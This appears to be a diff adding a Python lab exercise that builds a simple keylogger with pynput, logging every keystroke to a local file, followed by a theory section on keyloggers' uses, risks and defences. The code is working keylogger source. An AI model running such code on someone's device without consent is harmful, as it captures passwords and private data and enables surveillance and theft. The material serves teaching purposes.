@@ -1,0 +1,32 @@
+#Aim: Create a simple key logger using python 
+
+#Code:
+
+from pynput.keyboard import Key, Listener
+import logging
+
+# IMP: Add a path to 'log_dir' var or it won't produce output.
+log_dir = "" 
+
+# r"C:/users/username/desktop/"
+
+logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s:")
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
+#Theory:
+
+A keylogger is a type of software or hardware that is designed to record every keystroke made on a computer or mobile device, including passwords, credit card numbers, and other sensitive information. Keyloggers can be used for various purposes, including monitoring user activity, tracking employee productivity, and detecting malicious activities.
+
+In cybersecurity, keyloggers can be used both for legitimate and malicious purposes. For example, some organizations may use keyloggers to monitor employee activity and ensure that sensitive information is not being leaked or misused. However, keyloggers can also be used by cybercriminals to steal sensitive information, such as login credentials and banking information.
+
+In addition to recording keystrokes, some keyloggers may also capture screenshots or track mouse movements, allowing the attacker to gain a more comprehensive view of the user's activity. Some keyloggers may also be designed to run in stealth mode, making it difficult for the user to detect that their activity is being monitored.
+
+It's important to note that the use of keyloggers may have legal and ethical implications, and it should only be used with proper authorization and caution. Organizations and individuals should take appropriate measures to protect themselves against keyloggers and other forms of malware, such as installing anti-malware software and using strong passwords.
+
+
